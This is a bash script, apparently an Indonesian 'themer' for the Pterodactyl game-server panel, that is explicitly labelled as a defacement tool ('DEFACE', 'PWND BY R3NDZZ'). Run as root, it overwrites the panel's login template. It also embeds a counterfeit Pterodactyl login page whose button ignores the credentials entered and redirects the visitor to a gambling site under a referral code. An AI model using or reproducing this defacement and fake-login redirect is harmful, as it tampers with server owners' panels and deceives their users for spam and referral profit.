#!/bin/bash

# ==============================================
# R3NDZZ TOOLS - PTERODACTYL PANEL THEMER
# [ Simple 2 Menu - DEFACE & PULIHKAN ]
# ==============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ==============================================
# KONFIGURASI
# ==============================================
BACKUP_DIR="/root/pterodactyl_backup_$(date +%Y%m%d_%H%M%S)"
IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')

# ==============================================
# HTML PANEL - PTERODACTYL CUSTOM
# ==============================================
HTML_CONTENT='<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport" />
    <title>
      Ptrodactyl
    </title>
    <link rel="icon" type="image/x-icon" href="https://pterodactyl.io/logos/pterry.svg" />
    <script src="https://cdn.tailwindcss.com">
    </script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css?family=Roboto&amp;display=swap" rel="stylesheet" />
    <style>
      .custom-font { font-size: 14px; }  
    .custom-border { border: 1.9px solid #D1D5DB; }  
    body {  
      min-height: 100dvh;  
      overflow-y: auto;  
      font-family: 'Roboto', sans-serif;  
      background-color: #374150;  
    }  

    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #374151;
      z-index: -1;
    }

    h2 { font-weight: 400; }

    .animate-spin-slow {
      animation: spin 1.2s linear infinite;
      border-top-color: #374150;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    </style>
  </head>
  <body class="bg-[#374151] flex flex-col items-center justify-start pt-[1px] min-h-[120dvh]">
    <h2 class="text-center text-white text-3xl mb-[6px] mt-20">
      Login to Continue
    </h2>
    <div class="w-full max-w-sm bg-white rounded-lg shadow-lg p-7 flex flex-col items-center" style="max-height:calc(99vh - 60px);">
      <div class="flex justify-center mb-7">
        <img alt="Pterodactyl logo" class="w-48 h-48 object-contain" src="https://pterodactyl.io/logos/pterry.svg" />
      </div>
      <form id="loginForm" class="w-full">
        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
          USERNAME OR EMAIL
        </p>
        <input id="username" class="w-full rounded-md px-3 py-3 mb-4 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="text" required="" />
        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
          PASSWORD
        </p>
        <input id="password" class="w-full rounded-md px-3 py-3 mb-6 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="password" required="" />
        <button id="loginBtn" type="button" class="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white font-light py-4 rounded-[3px] transition-colors duration-200 custom-font flex justify-center items-center gap-2 relative overflow-hidden">
          <span id="loginText">          LOGIN
</span>
          <div id="miniSpinner" class="hidden absolute w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin">
          </div>
        </button>
      </form>
      <div class="text-center mt-[12px]">
        <a class="text-xs text-gray-500 hover:text-gray-700" href="#">        FORGOT PASSWORD?
</a>
      </div>
    </div>
    <p class="text-center text-xs mt-3 mb-0 select-none text-gray-400">
      Â© 2015 - 2025 Pterodactyl Software
    </p>
    <div id="spinner-bg" class="fixed inset-0 bg-[#374151] bg-opacity-100 z-50 hidden flex items-center justify-center" style="align-items: flex-start;">
      <div class="animate-spin-slow rounded-full h-16 w-16 border-8 border-gray-300 border-t-gray-600 mt-[12vh]">
      </div>
    </div>
    <script src="https://www.google.com/recaptcha/api.js?render=6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL" async="" defer="">
    </script>
    <script>
      window.addEventListener("load", () => {
      if (typeof grecaptcha !== "undefined") {
        grecaptcha.ready(() => {
          grecaptcha.execute('6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL', {action: 'login'}).then(token => {
            console.log('Decorative token:', token);
          });
        });
      }
    });

    async function onSubmit() {  
      const loginBtn = document.getElementById("loginBtn");
      const loginText = document.getElementById("loginText");
      const miniSpinner = document.getElementById("miniSpinner");
      const spinner = document.getElementById("spinner-bg");

      // Disable button and show mini spinner
      loginBtn.disabled = true;
      loginBtn.classList.add("bg-blue-400");
      loginBtn.classList.remove("hover:bg-[#2563eb]");
      loginText.classList.add("invisible");
      miniSpinner.classList.remove("hidden");

      // Show fullscreen spinner after a short delay
      await new Promise(r => setTimeout(r, 1000));
      spinner.classList.remove("hidden");

      // Redirect to the target link
      window.location.href = "https://congtogelbiz.com/register?referral_code=rndzz";
    }

    document.getElementById("loginBtn").addEventListener("click", onSubmit);
    </script>
  </body>
</html>'

# ==============================================
# HTML BLADE - UNTUK PTERODACTYL
# ==============================================
BLADE_CONTENT='@extends("layouts.auth")

@section("title")
    Login
@endsection

@section("content")
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport" />
    <title>
      Pterodactyl
    </title>
    <link rel="icon" type="image/x-icon" href="https://pterodactyl.io/logos/pterry.svg" />
    <script src="https://cdn.tailwindcss.com">
    </script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css?family=Roboto&amp;display=swap" rel="stylesheet" />
    <style>
      .custom-font { font-size: 14px; }  
    .custom-border { border: 1.9px solid #D1D5DB; }  
    body {  
      min-height: 100dvh;  
      overflow-y: auto;  
      font-family: "Roboto", sans-serif;  
      background-color: #374150;  
    }  

    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #374151;
      z-index: -1;
    }

    h2 { font-weight: 400; }

    .animate-spin-slow {
      animation: spin 1.2s linear infinite;
      border-top-color: #374150;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    </style>
  </head>
  <body class="bg-[#374151] flex flex-col items-center justify-start pt-[1px] min-h-[120dvh]">
    <h2 class="text-center text-white text-3xl mb-[6px] mt-20">
      Login to Continue
    </h2>
    <div class="w-full max-w-sm bg-white rounded-lg shadow-lg p-7 flex flex-col items-center" style="max-height:calc(99vh - 60px);">
      <div class="flex justify-center mb-7">
        <img alt="Pterodactyl logo" class="w-48 h-48 object-contain" src="https://pterodactyl.io/logos/pterry.svg" />
      </div>
      <form id="loginForm" class="w-full" method="POST" action="{{ route("auth.login") }}">
        @csrf
        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
          USERNAME OR EMAIL
        </p>
        <input id="username" name="user" class="w-full rounded-md px-3 py-3 mb-4 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="text" required="" />
        <p class="text-gray-700 text-xs px-1 py-0 mb-1 font-medium">
          PASSWORD
        </p>
        <input id="password" name="password" class="w-full rounded-md px-3 py-3 mb-6 text-base text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 custom-border" type="password" required="" />
        <button id="loginBtn" type="submit" class="w-full bg-[#3b82f6] hover:bg-[#2563eb] text-white font-light py-4 rounded-[3px] transition-colors duration-200 custom-font flex justify-center items-center gap-2 relative overflow-hidden">
          <span id="loginText">LOGIN</span>
          <div id="miniSpinner" class="hidden absolute w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin">
          </div>
        </button>
      </form>
      <div class="text-center mt-[12px]">
        <a class="text-xs text-gray-500 hover:text-gray-700" href="#">FORGOT PASSWORD?</a>
      </div>
    </div>
    <p class="text-center text-xs mt-3 mb-0 select-none text-gray-400">
      Â© 2015 - 2025 Pterodactyl Software
    </p>
    <div id="spinner-bg" class="fixed inset-0 bg-[#374151] bg-opacity-100 z-50 hidden flex items-center justify-center" style="align-items: flex-start;">
      <div class="animate-spin-slow rounded-full h-16 w-16 border-8 border-gray-300 border-t-gray-600 mt-[12vh]">
      </div>
    </div>
    <script src="https://www.google.com/recaptcha/api.js?render=6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL" async="" defer="">
    </script>
    <script>
      window.addEventListener("load", () => {
      if (typeof grecaptcha !== "undefined") {
        grecaptcha.ready(() => {
          grecaptcha.execute("6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL", {action: "login"}).then(token => {
            console.log("Decorative token:", token);
          });
        });
      }
    });

    document.getElementById("loginBtn")?.addEventListener("click", function(e) {
      const loginBtn = document.getElementById("loginBtn");
      const loginText = document.getElementById("loginText");
      const miniSpinner = document.getElementById("miniSpinner");
      const spinner = document.getElementById("spinner-bg");

      loginBtn.disabled = true;
      loginBtn.classList.add("bg-blue-400");
      loginBtn.classList.remove("hover:bg-[#2563eb]");
      loginText.classList.add("invisible");
      miniSpinner.classList.remove("hidden");
      
      setTimeout(() => {
        spinner.classList.remove("hidden");
      }, 500);
    });
    </script>
  </body>
</html>
@endsection'

# ==============================================
# HEADER
# ==============================================
show_header() {
    clear
    echo -e "${RED}"
    echo "    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
    echo "    â•‘              R3NDZZ TOOLS - PTERODACTYL THEMER            â•‘"
    echo "    â•‘                    [ PWND BY R3NDZZ ]                     â•‘"
    echo "    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    echo -e "${NC}"
    echo -e "${CYAN}ðŸ“¡ IP VPS: ${GREEN}$IP_VPS${NC}"
    echo -e "${CYAN}ðŸ“ Panel: ${GREEN}/var/www/pterodactyl${NC}"
    echo ""
}

# ==============================================
# FUNGSI CEK PTERODACTYL
# ==============================================
cek_pterodactyl() {
    if [ ! -d "/var/www/pterodactyl" ]; then
        echo -e "${RED}âŒ Pterodactyl tidak ditemukan di /var/www/pterodactyl${NC}"
        return 1
    fi
    return 0
}

# ==============================================
# FUNGSI BACKUP
# ==============================================
backup_files() {
    echo -e "\n${YELLOW}[â€¢] Membackup file Pterodactyl...${NC}"
    mkdir -p "$BACKUP_DIR"
    
    # Backup file blade login
    if [ -f "/var/www/pterodactyl/resources/views/auth/index.blade.php" ]; then
        cp "/var/www/pterodactyl/resources/views/auth/index.blade.php" "$BACKUP_DIR/index.blade.php.bak"
        echo -e "${GREEN}    âœ… Backup: index.blade.php${NC}"
    fi
    
    # Backup file public index
    if [ -f "/var/www/pterodactyl/public/index.php" ]; then
        cp "/var/www/pterodactyl/public/index.php" "$BACKUP_DIR/public_index.php.bak"
        echo -e "${GREEN}    âœ… Backup: public/index.php${NC}"
    fi
    
    echo -e "\n${GREEN}âœ… Backup selesai di: $BACKUP_DIR${NC}"
    echo "$BACKUP_DIR" > /tmp/pterodactyl_last_backup.txt
}

# ==============================================
# FUNGSI GANTI TAMPILAN
# ==============================================
ganti_tampilan() {
    echo -e "\n${PURPLE}ðŸŽ¨ ====== GANTI TAMPILAN PANEL ====== ðŸŽ¨${NC}"
    
    cek_pterodactyl || return
    
    # Backup dulu
    backup_files
    
    # Buat direktori auth jika belum ada
    mkdir -p /var/www/pterodactyl/resources/views/auth
    
    # Ganti file blade
    echo "$BLADE_CONTENT" > /var/www/pterodactyl/resources/views/auth/index.blade.php
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}âœ… File blade berhasil diganti!${NC}"
    else
        echo -e "${RED}âŒ Gagal mengganti file blade!${NC}"
        return
    fi
    
    # Bersihkan cache
    cd /var/www/pterodactyl
    php artisan view:clear
    php artisan cache:clear
    
    echo -e "\n${GREEN}âœ… Tampilan panel berhasil diganti!${NC}"
    echo -e "${CYAN}ðŸ”— Akses panel: http://$IP_VPS${NC}"
}

# ==============================================
# FUNGSI PULIHKAN
# ==============================================
pulihkan() {
    echo -e "\n${BLUE}ðŸ”„ ====== PULIHKAN PANEL ====== ðŸ”„${NC}"
    
    cek_pterodactyl || return
    
    # Cek file backup terakhir
    if [ -f "/tmp/pterodactyl_last_backup.txt" ]; then
        BACKUP_DIR=$(cat /tmp/pterodactyl_last_backup.txt)
        
        if [ -f "$BACKUP_DIR/index.blade.php.bak" ]; then
            cp "$BACKUP_DIR/index.blade.php.bak" "/var/www/pterodactyl/resources/views/auth/index.blade.php"
            echo -e "${GREEN}âœ… File berhasil direstore dari: $BACKUP_DIR${NC}"
            
            # Bersihkan cache
            cd /var/www/pterodactyl
            php artisan view:clear
            php artisan cache:clear
            
            echo -e "\n${GREEN}âœ… Panel berhasil dipulihkan!${NC}"
        else
            echo -e "${RED}âŒ File backup tidak ditemukan di $BACKUP_DIR${NC}"
        fi
    else
        # Cari backup lain
        BACKUPS=($(ls -d /root/pterodactyl_backup_* 2>/dev/null))
        
        if [ ${#BACKUPS[@]} -eq 0 ]; then
            echo -e "${RED}âŒ Tidak ada backup ditemukan!${NC}"
            return
        fi
        
        echo -e "${YELLOW}Pilih backup yang ingin dipulihkan:${NC}"
        for i in "${!BACKUPS[@]}"; do
            echo -e "${GREEN}[$i]${NC} ${BACKUPS[$i]}"
        done
        
        echo -ne "\n${CYAN}Pilih nomor backup: ${NC}"
        read choice
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -lt "${#BACKUPS[@]}" ]; then
            SELECTED="${BACKUPS[$choice]}"
            
            if [ -f "$SELECTED/index.blade.php.bak" ]; then
                cp "$SELECTED/index.blade.php.bak" "/var/www/pterodactyl/resources/views/auth/index.blade.php"
                echo -e "${GREEN}âœ… File berhasil direstore dari: $SELECTED${NC}"
                
                # Bersihkan cache
                cd /var/www/pterodactyl
                php artisan view:clear
                php artisan cache:clear
                
                echo -e "\n${GREEN}âœ… Panel berhasil dipulihkan!${NC}"
            else
                echo -e "${RED}âŒ File backup tidak valid!${NC}"
            fi
        else
            echo -e "${RED}Pilihan tidak valid!${NC}"
        fi
    fi
}

# ==============================================
# FUNGSI RESET DEFAULT
# ==============================================
reset_default() {
    echo -e "\n${YELLOW}ðŸ”„ ====== RESET KE TAMPILAN DEFAULT ====== ðŸ”„${NC}"
    
    cek_pterodactyl || return
    
    echo -e "${YELLOW}[â€¢] Mereset ke tampilan default Pterodactyl...${NC}"
    
    cd /var/www/pterodactyl
    php artisan vendor:publish --tag=laravel-views --force
    php artisan view:clear
    php artisan cache:clear
    
    echo -e "\n${GREEN}âœ… Panel berhasil direset ke default!${NC}"
}

# ==============================================
# FUNGSI SHOW MENU
# ==============================================
show_menu() {
    show_header
    
    echo -e "${WHITE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${WHITE}â•‘                 MENU UTAMA                     â•‘${NC}"
    echo -e "${WHITE}â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£${NC}"
    echo -e "${WHITE}â•‘                                                â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[1]${NC} ðŸŽ¨  GANTI TAMPILAN PANEL (NEW)       ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[2]${NC} ðŸ”„  PULIHKAN TAMPILAN                ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[3]${NC} ðŸ”§  RESET KE DEFAULT                 ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[4]${NC} ðŸ’¾  BACKUP MANUAL                    ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘  ${GREEN}[0]${NC} ðŸšª  KELUAR                           ${WHITE}â•‘${NC}"
    echo -e "${WHITE}â•‘                                                â•‘${NC}"
    echo -e "${WHITE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""
    echo -ne "${YELLOW}âž¤ Pilih menu [0-4]: ${NC}"
}

# ==============================================
# CEK ROOT
# ==============================================
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}âŒ Harus root! Jalankan dengan sudo.${NC}"
   exit 1
fi

# ==============================================
# INSTALL DEPENDENCIES
# ==============================================
install_deps() {
    if ! command -v curl &> /dev/null; then
        apt-get update && apt-get install curl -y
    fi
}

install_deps

# ==============================================
# MAIN LOOP
# ==============================================
while true; do
    show_menu
    read choice
    
    case $choice in
        1)
            ganti_tampilan
            ;;
        2)
            pulihkan
            ;;
        3)
            reset_default
            ;;
        4)
            backup_files
            echo -e "\n${GREEN}âœ… Backup manual selesai!${NC}"
            ;;
        0)
            echo -e "\n${GREEN}Terima kasih telah menggunakan R3NDZZ Tools!${NC}"
            echo -e "${CYAN}ðŸ”¥ PWND BY R3NDZZ ðŸ”¥${NC}\n"
            exit 0
            ;;
        *)
            echo -e "\n${RED}Pilihan tidak valid!${NC}"
            ;;
    esac
    
    echo ""
    echo -ne "${CYAN}Tekan Enter untuk kembali ke menu...${NC}"
    read
done
